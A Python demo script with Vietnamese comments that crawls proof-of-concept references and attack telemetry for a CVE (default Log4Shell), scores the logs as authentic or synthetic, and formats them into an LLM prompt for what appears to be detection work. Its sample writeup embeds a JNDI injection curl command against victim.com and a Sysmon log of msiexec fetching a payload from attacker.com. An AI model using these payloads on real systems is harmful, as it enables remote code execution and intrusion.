"""Demo Telemetry Crawler Script — Thử nghiệm luồng thu thập Log mẫu 2-Nhánh & Scoring.

Cách chạy:
    python scripts/demo_telemetry_crawler.py --cve CVE-2021-44228
"""
from __future__ import annotations

import asyncio
import sys
import argparse
import json
import io
from pathlib import Path

# Force UTF-8 for stdout on Windows
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

# Add project root to sys.path
ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from src.infrastructure.providers.poc.provider import PoCProvider
from src.infrastructure.providers.telemetry_repo.provider import TelemetryRepoProvider
from src.shared.parsers.markdown_ast_parser import MarkdownASTParser
from src.usecases.step_4_telemetry._shared_engines.telemetry_matcher import TelemetryHybridMatcher
from src.usecases.step_4_telemetry._shared_engines.scoring_engine import TelemetryScoringEngine
from src.usecases.step_2_analysis.services.ai_service import AIBehaviorService
from src.domain.models.telemetry import TelemetryItem


async def run_demo(cve_id: str, keywords: list[str], technique_ids: list[str]) -> None:
    print(f"\n==========================================================")
    print(f"[*] DEMO TELEMETRY & LOG CRAWLER 2-NHANH FOR: {cve_id}")
    print(f"==========================================================\n")

    poc_provider = PoCProvider()
    telemetry_provider = TelemetryRepoProvider()
    markdown_parser = MarkdownASTParser()
    matcher = TelemetryHybridMatcher()
    scoring_engine = TelemetryScoringEngine()

    # ------------------------------------------------------------------
    # NHÁNH 1: PoC Repositories & Markdown Code Blocks
    # ------------------------------------------------------------------
    print("[1] [NHANH 1] Truy van danh sach PoC GitHub (nomi-sec & NVD)...")
    poc_res = await poc_provider.fetch(cve_id)
    poc_urls = poc_res.get("poc_references") or []
    print(f"   -> Tim thay {len(poc_urls)} PoC repos uy tin cho {cve_id}:")
    for url in poc_urls[:3]:
        print(f"      - {url}")

    sample_md_writeup = """
# Exploit Writeup
Execute command:
```bash
curl -H "X-Api-Version: ${jndi:ldap://10.0.0.1/a}" http://victim.com/
```

Sysmon Event Log:
```sysmon
<Event>
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\msiexec.exe</Data>
    <Data Name="CommandLine">msiexec.exe /i http://attacker.com/payload.msi /q</Data>
  </EventData>
</Event>
```
"""
    code_blocks = markdown_parser.extract_code_blocks(sample_md_writeup)
    print(f"\n   -> [Markdown AST Parser] Trich xuat duoc {len(code_blocks)} code blocks tu Markdown:")
    for b in code_blocks:
        print(f"      - Type: {b['type'].upper():<8} | Lang: {b['lang']:<8} | Snippet: {b['code'][:50]}...")

    # ------------------------------------------------------------------
    # NHÁNH 2: Kho Telemetry Chuyên Biệt (OTRF / Mordor / EVTX-ATTACK-SAMPLES)
    # ------------------------------------------------------------------
    print(f"\n[2] [NHANH 2] Query Kho Telemetry Chuyen Biet (OTRF / EVTX-ATTACK-SAMPLES)...")
    print(f"   -> Criteria Hybrid Matching: Keywords={keywords}, Techniques={technique_ids}")
    
    authentic_items = await telemetry_provider.fetch_authentic_telemetry(
        keywords=keywords,
        technique_ids=technique_ids
    )

    # Synthetic log fallback simulation
    synthetic_item = TelemetryItem(
        source="exploit.py (Script Analysis)",
        score=3.0,
        label="Synthetic",
        confidence="LOW",
        event_id=1,
        log_data={
            "SimulatedCommand": f"python exploit.py --target {cve_id}",
            "Payload": "${jndi:ldap://...}"
        }
    )

    all_candidate_items = authentic_items + [synthetic_item]

    # ------------------------------------------------------------------
    # SCORING ENGINE & HYBRID MATCHER
    # ------------------------------------------------------------------
    matched_items = matcher.match_logs(all_candidate_items, keywords, technique_ids)
    authentic_logs, synthetic_logs = scoring_engine.categorize_items(matched_items)

    print(f"\n==========================================================")
    print(f"[RESULT] KET QUA PHAN LOAI & DAN NHAN LOG (SCORING ENGINE)")
    print(f"==========================================================")
    print(f"   - So ban ghi AUTHENTIC LOGS (Score 7-10/10) : {len(authentic_logs)}")
    print(f"   - So ban ghi SYNTHETIC LOGS (Score 3/10)    : {len(synthetic_logs)}")

    # Convert to dicts for AI Prompt formatter
    auth_dicts = [i.model_dump() for i in authentic_logs]
    synth_dicts = [i.model_dump() for i in synthetic_logs]

    formatted_prompt_block = AIBehaviorService._format_telemetry_blocks(auth_dicts, synth_dicts)

    print(f"\n==========================================================")
    print(f"[AI PROMPT] HINH ANH NOI DUNG LOG PROMPT NAP CHO AI (LLM)")
    print(f"==========================================================")
    print(formatted_prompt_block)


def main() -> None:
    parser = argparse.ArgumentParser(description="Demo Telemetry & Log Crawler 2-Nhánh")
    parser.add_argument("--cve", type=str, default="CVE-2021-44228", help="Mã CVE (Default: CVE-2021-44228)")
    parser.add_argument("--keywords", nargs="+", default=["msiexec", "jndi"], help="Keywords tìm kiếm log")
    parser.add_argument("--technique", nargs="+", default=["T1190", "T1059"], help="MITRE ATT&CK Technique IDs")

    args = parser.parse_args()
    asyncio.run(run_demo(args.cve, args.keywords, args.technique))


if __name__ == "__main__":
    main()
